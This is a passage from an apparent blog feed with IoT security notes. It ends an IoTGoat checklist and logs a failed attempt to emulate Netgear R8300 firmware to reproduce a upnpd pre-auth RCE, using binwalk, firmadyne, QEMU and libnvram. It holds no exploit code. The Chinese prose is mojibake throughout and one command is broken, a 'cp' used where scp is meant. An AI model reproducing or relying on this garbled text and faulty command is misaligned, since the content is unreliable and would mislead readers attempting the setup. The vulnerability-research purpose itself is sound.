Storage:</h2><p><code>&lt;IP&gt;/cgi-bin/luci/admin/network/wireless/wl0.network1</code></p><p>wifiæ²¡æœ‰å¯†ç </p><h2 id="No-8-Lack-of-Device-Management"><a href="#No-8-Lack-of-Device-Management" class="headerlink" title="No 8: Lack of Device Management:"></a>No 8: Lack of Device Management:</h2><p><code>&lt;IP&gt;/cgi-bin/luci/admin/status/syslog</code>æ²¡æœ‰å¼€å¯</p><h2 id="No-9-Insecure-Default-Settings"><a href="#No-9-Insecure-Default-Settings" class="headerlink" title="No 9: Insecure Default Settings:"></a>No 9: Insecure Default Settings:</h2><h3 id="Many-included-in-IoTGoat-such-as-missing-secure-headers-to-prevent-framing-as-well-as-CSRF-protections-on-sensitive-requests"><a href="#Many-included-in-IoTGoat-such-as-missing-secure-headers-to-prevent-framing-as-well-as-CSRF-protections-on-sensitive-requests" class="headerlink" title="Many included in IoTGoat such as missing secure headers to prevent framing as well as CSRF protections on sensitive requests."></a>Many included in IoTGoat such as missing secure headers to prevent framing as well as CSRF protections on sensitive requests.</h3><blockquote><p>æ£€æµ‹CSRFæ¼æ´æ˜¯ä¸€é¡¹æ¯”è¾ƒç¹ççš„å·¥ä½œï¼Œæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå»æ‰Refererå­—æ®µåå†é‡æ–°æäº¤ï¼Œå¦‚æœè¯¥æäº¤è¿˜æœ‰æ•ˆï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šå­˜åœ¨CSRFæ¼æ´ã€‚</p><p>â€‹    ç›®å‰é˜²å¾¡ CSRF æ”»å‡»ä¸»è¦æœ‰ä¸‰ç§ç­–ç•¥ï¼šéªŒè¯ HTTP Referer å­—æ®µï¼›åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ  token å¹¶éªŒè¯ï¼›åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯ã€‚</p><p><a href="https://blog.csdn.net/xiaoxinshuaiga/article/details/80766369">link</a></p></blockquote><h2 id="No-10-Lack-of-Physical-Hardening"><a href="#No-10-Lack-of-Physical-Hardening" class="headerlink" title="No 10: Lack of Physical Hardening:"></a>No 10: Lack of Physical Hardening:</h2><p>ç‰©ç†å¼ºåŒ–ï¼Œåº”è¯¥æ˜¯æŒ‡å¯¹å›ºä»¶çš„ä¿æŠ¤</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Netgear Nighthawk R8300 upnpd PreAuth RCE å¤ç°è¾…åŠ©</title>
    <link href="/2020/10/19/Netgear%20Nighthawk%20R8300%20upnpd%20PreAuth%20RCE%20%E5%A4%8D%E7%8E%B0%E8%BE%85%E5%8A%A9/"/>
    <url>/2020/10/19/Netgear%20Nighthawk%20R8300%20upnpd%20PreAuth%20RCE%20%E5%A4%8D%E7%8E%B0%E8%BE%85%E5%8A%A9/</url>
    
    <content type="html"><![CDATA[<p>å°å£°ï¼šå› ä¸ºnvramé‚£é‡Œæˆ‘å®åœ¨æä¸å®šäº†ï¼Œå¦‚æœæœ‰æ„¿æ„å¸®å¿™çš„å¸ˆå‚…æ¬¢è¿è”ç³»ï¼</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p><a href="https://www.netgear.com/support/product/R8300.aspx#Firmware%20Version%201.0.2.130">å›ºä»¶ä¸‹è½½åœ°å€</a></p><p>md5sum</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c3eb8f8c004d466796a05b4c60503162</span>  R<span class="hljs-number">8300</span>-V<span class="hljs-number">1.0.2.130</span>_<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">99</span>.zip<br></code></pre></td></tr></table></figure><p>binwalk</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">binwalk R8300-V1.0.2.130_1.0.99.chk <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>58            0x3A            TRX firmware header, little endian, image size: 32653312 bytes, CRC32: 0x5CEAB739, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21AB50, rootfs offset: 0x0<br>86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5470272 bytes<br>2206602       0x21AB8A        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 30443160 bytes, 1650 inodes, blocksize: 131072 bytes, created: 2018-12-13 04:36:38<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾upnpd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">iot@attifyos ~/t/f/_/_R8300-V1.0.2.130_1.0.99.chk.extracted&gt; <span class="hljs-built_in">cd</span> squashfs-root/<br>iot@attifyos ~/t/f/_/_/squashfs-root&gt; ls<br>bin/  etc/  media@  opt/   sbin/   sys/  usr/  www/<br>dev/  lib/  mnt/    proc/  share/  tmp/  var@<br>iot@attifyos ~/t/f/_/_/squashfs-root&gt; find . -name upnpd<br>./usr/sbin/upnpd<br>iot@attifyos ~/t/f/_/_/squashfs-root&gt; file ./usr/sbin/upnpd<br>./usr/sbin/upnpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped<br></code></pre></td></tr></table></figure><h3 id="fatæ¨¡æ‹Ÿ"><a href="#fatæ¨¡æ‹Ÿ" class="headerlink" title="fatæ¨¡æ‹Ÿ"></a>fatæ¨¡æ‹Ÿ</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">./fat.py R8300-V1.0.2.130_1.0.99.zip <br><br>                               __           _<br>                              / _|<span class="hljs-string">         </span>|<span class="hljs-string"> </span>|<br>                             |<span class="hljs-string"> </span>|<span class="hljs-string">_    __ _  </span>|<span class="hljs-string"> </span>|_<br>                             |<span class="hljs-string">  _</span>|<span class="hljs-string">  / _` </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> __</span>|<br>                             |<span class="hljs-string"> </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|_<br>                             |<span class="hljs-string">_</span>|<span class="hljs-string">    \__,_</span>|<span class="hljs-string">  \__</span>|<br><br>                Welcome to the Firmware Analysis Toolkit - v0.3<br>    Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation<br>                  By Attify - https://attify.com  |<span class="hljs-string"> @attifyme</span><br><span class="hljs-string">    </span><br><span class="hljs-string">[+] Firmware: R8300-V1.0.2.130_1.0.99.zip</span><br><span class="hljs-string">[+] Extracting the firmware...</span><br><span class="hljs-string">[+] Image ID: 1</span><br><span class="hljs-string">[+] Identifying architecture...</span><br><span class="hljs-string">[+] Architecture: armel</span><br><span class="hljs-string">[+] Building QEMU disk image...</span><br><span class="hljs-string">[+] Setting up the network connection, please standby...</span><br><span class="hljs-string">[+] Network interfaces: []</span><br><span class="hljs-string">[+] All set! Press ENTER to run the firmware...</span><br><span class="hljs-string">[+] When running, press Ctrl + A X to terminate qemu</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰æä¾›ipå’Œç«¯å£çš„è¯ï¼Œä¸€èˆ¬å°±ä¸èƒ½è‡ªåŠ¨å¤„ç†äº†ã€‚</p><h3 id="qemu-user-modeæ¨¡æ‹Ÿ"><a href="#qemu-user-modeæ¨¡æ‹Ÿ" class="headerlink" title="qemu user modeæ¨¡æ‹Ÿ"></a>qemu user modeæ¨¡æ‹Ÿ</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo chroot . .<span class="hljs-regexp">/qemu-arm-static  ./u</span>sr<span class="hljs-regexp">/sbin/u</span>pnpd<br>æˆ–è€… <br>sudo chroot . .<span class="hljs-regexp">/qemu-arm-static --strace ./u</span>sr<span class="hljs-regexp">/sbin/u</span>pnpd<br></code></pre></td></tr></table></figure><blockquote><p>-strace              QEMU_STRACE       log system calls</p></blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">33359 </span><span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;/var/run/upnpd.pid&quot;</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="hljs-number">0666</span>) = -<span class="hljs-number">1</span> errno=<span class="hljs-number">2</span> (No such file <span class="hljs-keyword">or</span> directory)<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ–‡ä»¶ç»“æ„å</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">4</span> mrbelieve mrbelieve     <span class="hljs-number">4096</span> Oct <span class="hljs-number">20</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> tmp<br><span class="hljs-attribute">drwxrwxr</span>-x <span class="hljs-number">10</span> mrbelieve mrbelieve     <span class="hljs-number">4096</span> Dec <span class="hljs-number">12</span>  <span class="hljs-number">2018</span> usr<br><span class="hljs-attribute">lrwxrwxrwx</span>  <span class="hljs-number">1</span> mrbelieve mrbelieve        <span class="hljs-number">7</span> Dec <span class="hljs-number">12</span>  <span class="hljs-number">2018</span> var -&gt; tmp/var<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">8</span> mrbelieve mrbelieve    <span class="hljs-number">24576</span> Dec <span class="hljs-number">12</span>  <span class="hljs-number">2018</span> www<br></code></pre></td></tr></table></figure><p>é€šè¿‡<code>mkdir -p ./tmp/var/run</code>è§£å†³ï¼Œå†æ¬¡è¿è¡Œåæ˜¾ç¤ºå¤§é‡</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/nvram&quot;</span>,O_RDWR) = <span class="hljs-number">-1</span> errno=<span class="hljs-number">2</span> (No such <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">directory</span>)<br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/dev/</span>nvram: No such <span class="hljs-keyword">file</span> or directory<br><span class="hljs-regexp">/dev/</span>nvram: No such <span class="hljs-keyword">file</span> or directory<br><span class="hljs-regexp">/dev/</span>nvram: No such <span class="hljs-keyword">file</span> or directory<br>open: No such <span class="hljs-keyword">file</span> or directory<br></code></pre></td></tr></table></figure><blockquote><p>å‡ä¸<code>NVRAM</code>æœ‰å…³ï¼Œè¯¥é”™è¯¯åœ¨è¿›è¡Œ<code>IoT</code>è®¾å¤‡ä»¿çœŸæ—¶ä¼šç»å¸¸é‡åˆ°ã€‚<code>NVRAM</code>ä¸­ä¿å­˜äº†è®¾å¤‡çš„ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œè€Œç¨‹åºè¿è¡Œæ—¶éœ€è¦è¯»å–é…ç½®ä¿¡æ¯ï¼Œç”±äºç¼ºå°‘å¯¹åº”çš„å¤–è®¾ï¼Œå› æ­¤ä¼šæŠ¥é”™ã€‚ä¸€ç§å¸¸è§çš„è§£å†³æ–¹æ¡ˆæ˜¯<code>&quot;åŠ«æŒ&quot;</code>ä¸<code>NVRAM</code>è¯»å†™ç›¸å…³çš„å‡½æ•°ï¼Œé€šè¿‡è½¯ä»¶çš„æ–¹å¼æ¥æä¾›ç›¸åº”çš„é…ç½®ã€‚</p><p>ç½‘ä¸Šæœ‰å¾ˆå¤šç±»ä¼¼çš„æ¨¡æ‹Ÿ<code>NVRAM</code>è¡Œä¸ºçš„åº“ï¼Œè€Œ<code>Firmadyne</code>æ¡†æ¶æä¾›çš„<code>libnvram</code>åº“ï¼šæ”¯æŒå¾ˆå¤šå¸¸è§çš„<code>api</code>ï¼Œå¯¹å¾ˆå¤šåµŒå…¥å¼è®¾å¤‡è¿›è¡Œäº†é€‚é…ï¼ŒåŒæ—¶è¿˜ä¼šè§£æå›ºä»¶ä¸­é»˜è®¤çš„ä¸€äº›<code>NVRAM</code>é…ç½®ï¼Œå®ç°æ–¹å¼æ¯”è¾ƒä¼˜é›…ã€‚é‡‡ç”¨è¯¥åº“ï¼Œå¾€å¾€åªéœ€è¦åšå¾ˆå°‘çš„æ”¹åŠ¨ï¼Œç”šè‡³æ— éœ€æ”¹åŠ¨ï¼Œå°±å¯ä»¥æ»¡è¶³éœ€æ±‚ã€‚</p></blockquote><p>libnvram<a href="https://github.com/firmadyne/libnvram">æ–‡æ¡£</a>ã€‚ç¼–è¯‘å¥½åç›´æ¥æ”¾åœ¨squashfs-root</p><blockquote><p>ç¼–è¯‘å¯ä»¥ä½¿ç”¨buildrootï¼Œmake menuconfigè®°å¾—å°†â€Target Architectureâ€æ”¹æˆARM(little endian) ï¼Œæœ€åä½¿ç”¨<code>buildroot/output/host/usr/bin/arm-linux-gcc -Wall -fPIC -shared nvram.c -o libnvram.so.armel -nostdlib</code>  å³å¯</p><p>å…·ä½“é€‰é¡¹æ¥è‡ªlibnvramçš„Makefile</p></blockquote><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">sem_lock:</span> Triggering NVRAM initialization!<br><span class="hljs-symbol">nvram_init:</span> Initializing NVRAM...<br><span class="hljs-symbol">sem_get:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore <span class="hljs-keyword">key</span>!<br><span class="hljs-symbol">sem_lock:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore!<br><span class="hljs-symbol">sem_get:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore <span class="hljs-keyword">key</span>!<br><span class="hljs-symbol">sem_unlock:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore!<br><span class="hljs-symbol">nvram_init:</span> Unable <span class="hljs-keyword">to</span> mount tmpfs <span class="hljs-keyword">on</span> mount point /firmadyne/libnvram/!<br><span class="hljs-symbol">sem_get:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore <span class="hljs-keyword">key</span>!<br><span class="hljs-symbol">sem_lock:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore!<br><span class="hljs-symbol">sem_get:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore <span class="hljs-keyword">key</span>!<br><span class="hljs-symbol">sem_unlock:</span> Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> semaphore!<br><span class="hljs-symbol">nvram_get_buf:</span> Unable <span class="hljs-keyword">to</span> open <span class="hljs-keyword">key</span>: /firmadyne/libnvram/upnpd_debug_level!<br></code></pre></td></tr></table></figure><p>è¿™æ ·å¯ä»¥å¼€å§‹è°ƒnvramçš„é…ç½®äº†</p><p>è¿™æ ·æˆ‘å°±å®åœ¨è°ƒä¸æ¥äº†ã€‚ã€‚ã€‚<strong>æœ€ç»ˆæ­»åœ¨lan_ipaddrä¸Šé¢ï¼Œæ€ä¹ˆè®¾ç½®éƒ½ä¸å¯¹</strong>ã€‚ã€‚ã€‚</p><h3 id="qemu-system-modeæ¨¡æ‹Ÿ"><a href="#qemu-system-modeæ¨¡æ‹Ÿ" class="headerlink" title="qemu system modeæ¨¡æ‹Ÿ"></a>qemu system modeæ¨¡æ‹Ÿ</h3><p><strong>è¿‡äºéº»çƒ¦ï¼Œæœ¬è´¨æ˜¯èµ·ä¸€ä¸ªå®Œæ•´è™šæ‹Ÿæœºç„¶åå†è·‘è¿™ä¸ªæœåŠ¡çš„æ ·å­ï¼ˆè€Œä¸”è™šæ‹Ÿæœºå¾ˆæ…¢ï¼‰</strong></p><p>ä¸‹é¢æ˜¯ubuntu20ç¯å¢ƒï¼ŒattifyOSè¿˜æœªæµ‹è¯•æˆåŠŸè¿‡ã€‚</p><p>æ–°å»ºä¸€ä¸ªtapæ¥å£ï¼Œå¹¶é…ç½®ip</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tunctl -t tap<span class="hljs-number">0</span> -u `whoami`<br><br><span class="hljs-attribute">sudo</span> ifconfig tap<span class="hljs-number">0</span> <span class="hljs-number">192.168.2.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><blockquote><p>The tap networking backend makes use of a tap networking device in the host. It offers very good performance and can be configured to create virtually any type of network topology. Unfortunately, it requires configuration of that network topology in the host which tends to be different depending on the operating system you are using.</p></blockquote><p>ç„¶åæŠŠ<code>vmlinuz-3.2.0-4-vexpress</code>ï¼Œ <code>initrd.img-3.2.0-4-vexpress -drive</code>å’Œ<code>debian_wheezy_armhf_standard.qcow2</code>æ”¾åˆ°å½“å‰ç›®å½•ä¸‹ã€‚<a href="https://people.debian.org/~aurel32/qemu/armhf/">å‰é¢å‡ ä¸ªä¸œè¥¿çš„ä¸‹è½½åœ°å€</a></p><blockquote><p>armel and armhf</p><p>The ARM EABI (<strong>armel</strong>) port targets a range of older 32-bit ARM devices, particularly those used in NAS hardware and a variety of <em>plug computers. The newer ARM hard-float (*</em>armhf**) port supports newer, more powerful 32-bit devices using version 7 of the ARM architecture specification.</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qemu</span>-system-arm -M vexpress-a<span class="hljs-number">9</span> -kernel vmlinuz-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-<span class="hljs-number">4</span>-vexpress -initrd initrd.img-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-<span class="hljs-number">4</span>-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow<span class="hljs-number">2</span> -append <span class="hljs-string">&quot;root=/dev/mmcblk0p2&quot;</span> -net nic -net tap,ifname=tap<span class="hljs-number">0</span>,script=no,downscript=no -nographic<br></code></pre></td></tr></table></figure><p>å…³äºè¿™ä¸ª<code>root=/dev/mmcblk0p2</code>ï¼Œæˆ‘è‡ªå·±å°è¯•ç›´æ¥å°†æ–‡ä»¶å¤¹æ”¾è¿›å»ä¼šèµ·ä¸æ¥ã€‚ã€‚ã€‚æˆ‘çš„è§£å†³æ–¹æ³•æ˜¯å…ˆè¿™æ ·è·‘ç„¶åé€šè¿‡scpä¼ è¿›å»</p><p><code>cp -r root@192.168.2.2  ./squashfs-root /home/user/squashfs-root</code></p><p>ç­‰å¾…â€¦â€¦</p><p>å¯åŠ¨ä¹‹å</p><blockquote><ul><li>Root password:  root</li><li>User account:   user</li><li>User password:  user</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@debian-armhf:/home/user<span class="hljs-comment"># ifconfig eth0 192.168.2.2/24</span><br>root@debian-armhf:/home/user<span class="hljs-comment"># ifconfig</span><br>eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  <br>          inet addr:192.168.2.2  Bcast:192.168.2.255  Mask:255.255.255.0<br>          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:11 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:1000 <br>          RX bytes:0 (0.0 B)  TX bytes:2178 (2.1 KiB)<br>          Interrupt:47 <br><br>lo        Link encap:Local Loopback  <br>          inet addr:127.0.0.1  Mask:255.0.0.0<br>          inet6 addr: ::1/128 Scope:Host<br>          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:0 <br>          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)<br>root@debian-armhf:/home/user<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">root@debian-armhf:/home/user<span class="hljs-comment"># mount -t proc /proc ./squashfs-root/proc</span><br>root@debian-armhf:/home/user<span class="hljs-comment"># mount -o bind /dev ./squashfs-root/dev</span><br>root@debian-armhf:/home/user<span class="hljs-comment"># chroot ./squashfs-root/ sh #åˆ‡æ¢æ ¹ç›®å½•åæ‰§è¡Œæ–°ç›®å½•ç»“æ„ä¸‹çš„ sh shell</span><br><br><br>BusyBox v1.7.2 (2018-12-13 12:34:27 CST) built-in shell (ash)<br>Enter <span class="hljs-string">&#x27;help&#x27;</span> <span class="hljs-keyword">for</span> a list of built-in commands.<br><br>uid=0 gid=0(root)<br><br></code></pre></td></tr></table></figure><blockquote><p><a href="https://zhuanlan.zhihu.com/p/61278842?from_voters_page=true"><strong>PS:</strong></a> ä½¿ç”¨ chroot åï¼Œç³»ç»Ÿè¯»å–çš„æ˜¯æ–°æ ¹ä¸‹çš„ç›®å½•å’Œæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å›ºä»¶çš„ç›®å½•å’Œæ–‡ä»¶ chroot é»˜è®¤ä¸ä¼šåˆ‡æ¢ /dev å’Œ /proc, å› æ­¤åˆ‡æ¢æ ¹ç›®å½•å‰éœ€è¦å…ˆæŒ‚è½½è¿™ä¸¤ä¸ªç›®å½•</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">```<br><br>&gt; -v, --invert-match        select non-matching lines<br><br>æ²¡æœ‰ä»»ä½•ä¿¡æ¯å°±<span class="hljs-built_in">exit</span>äº†<br><br>==å’‹è°ƒè¯•å‡ºæ˜¯opençš„é—®é¢˜çš„ã€‚ã€‚ã€‚==<br><br>åˆ›å»ºäº†/var/runä¹‹åï¼Œå°±æç¤º<br><br></code></pre></td></tr></table></figure><p>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory<br>/dev/nvram: No such file or directory</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment">## åˆ†æå‚è€ƒ</span><br><br>- https:<span class="hljs-regexp">//ssd</span>-disclosure.com/ssd-advisory-netgear-nighthawk-r830<span class="hljs-number">0</span>-upnpd-preauth-rce/<br>- https:<span class="hljs-regexp">//pap</span>er.seebug.org/<span class="hljs-number">1311</span>/<span class="hljs-comment">#1</span><br><br>- https:<span class="hljs-regexp">//</span>cq674350529.github.io/<span class="hljs-number">2020</span>/09/<span class="hljs-number">16</span>/PSV-<span class="hljs-number">2020</span>-<span class="hljs-number">0211</span>-Netgear-R830<span class="hljs-number">0</span>-UPnP%E6%A<span class="hljs-number">0</span>%88%E6%BA%A2%E5%87%BA%E6%BC%<span class="hljs-number">8</span>F%E6%B4%<span class="hljs-number">9</span>E%E5%88%86%E6%<span class="hljs-number">9</span>E%90/<br><br><span class="hljs-comment">### åˆ†ææ€»ç»“</span><br><br><span class="hljs-comment">#### PCå¯„å­˜å™¨åœ¨armä¸­çš„ä½œç”¨</span><br><br>Program Counter å­˜å‚¨ä¸‹ä¸€æ¡ç¨‹åºæŒ‡ä»¤çš„åœ°å€ã€‚é¡ºåºæ‰§è¡Œçš„æƒ…å†µæ˜¯å­˜å‚¨å½“å‰åœ°å€+<span class="hljs-number">4</span><br><br><span class="hljs-comment">#### å¯ç”¨rasm2å·¥å…·ç¿»è¯‘æ±‡ç¼–æŒ‡ä»¤åˆ°æœºå™¨æŒ‡ä»¤</span><br><br>ä¾‹å­ï¼š<br><br></code></pre></td></tr></table></figure><p>0030a0e1</p><pre><code>è¿™æ ·å¯ä»¥åœ¨ida Patch program - Change byteé‡Œä½¿ç”¨#### å¤šå…³æ³¨è¾ƒå±é™©å‡½æ•°strcpyï¼Œç­‰&gt; strcpyæ‹·è´çš„æ—¶å€™ï¼Œå¦‚æœn &lt; srcçš„é•¿åº¦ï¼Œé‚£åªæ˜¯å°†srcçš„å‰å‡ ä¸ªå­—ç¬¦å¤åˆ¶åˆ°destçš„å‰nä¸ªå­—ç¬¦é‡Œï¼Œä¸ä¼šè‡ªåŠ¨æ·»åŠ `\x00`ã€‚è€Œå¦‚æœsrcå°äºnï¼Œåˆ™ä¼šè‡ªåŠ¨å¡«å……`\x00`åˆ°destç›´è‡³å¤åˆ¶å®Œæœªåˆå§‹åŒ–çš„ç©ºé—´#### å‡½æ•°ä¸æ¼æ´ç‚¹ä¹‹é—´è·¯å¾„è¾ƒçŸ­æ ˆä¸Šæ•°æ®ä¸ä¼šå‘ç”Ÿå¤ªå¤§å˜åŒ–ï¼Œå¯ä»¥å¤ç”¨å¡«å……çš„rop gadgets#### armæ ˆæº¢å‡ºä¹‹åå¥½åƒå¯ä»¥ä¸€è·¯è¦†ç›–åˆ°nä¸ªå¯„å­˜å™¨ï¼ˆæœ‰å¾…è¯¦ç»†ç¡®è®¤## å‚è€ƒåˆ†æå‚è€ƒ- https://paper.seebug.org/1311/#1- https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/[qemuéƒ¨åˆ†å‚è€ƒ](https://paper.seebug.org/480/)</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PCTF2016_Confused_ARM_è°ƒè¯•è®°å½•</title>
    <link href="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
    
